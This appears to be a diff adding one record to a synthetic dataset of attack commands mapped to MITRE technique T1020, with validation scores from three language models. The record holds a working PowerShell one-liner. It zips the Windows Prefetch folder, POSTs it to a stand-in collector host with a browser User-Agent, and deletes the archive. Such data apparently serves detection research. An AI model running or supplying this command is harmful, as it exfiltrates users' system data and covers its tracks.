@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $pf=Join-Path $env:TEMP ('prefetch_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\Prefetch' -DestinationPath $pf -Force; Invoke-WebRequest -Uri 'https://collector.example.net/store/pf' -Method Post -InFile $pf -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'X-Client'=$env:COMPUTERNAME } -ErrorAction SilentlyContinue; Remove-Item $pf -Force",
+  "explanation": "Zips the Prefetch directory and exfiltrates it via HTTPS POST to analyze execution history.",
+  "rationale_steps": [
+    "Collect Prefetch artifacts indicating program execution.",
+    "Upload via Invoke-WebRequest POST over HTTPS.",
+    "Mask as generic web traffic and delete the temporary archive."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-be2cca03",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quoting, valid cmdlets/parameters, proper semicolon separators, and a correctly constructed header hashtable.",
+        "semantic_score": 4,
+        "semantic_justification": "It compresses the Prefetch directory and exfiltrates the archive via HTTPS POST with cleanup, matching automated exfiltration behavior, though access to C:\\Windows\\Prefetch may fail for non-admin users on some systems.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T02:50:42.353063Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, cmdlet usage, parameter passing, balanced quotes/parentheses/braces, and appropriate semicolons separating each command.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by compressing the Windows Prefetch directory (collection), using a timestamped filename, exfiltrating via HTTPS POST (transfer method) with custom headers for obfuscation, and cleaning up the evidence afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:50:45.473811Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct variable assignments, cmdlet usage, parameter formatting, balanced quotes, and proper command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of zipping the Prefetch directory and exfiltrating it via HTTPS POST, aligning precisely with the T1020 Automated Exfiltration technique using appropriate tools and a realistic operational flow for a user with 'None' privilege.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:33:48.901554Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
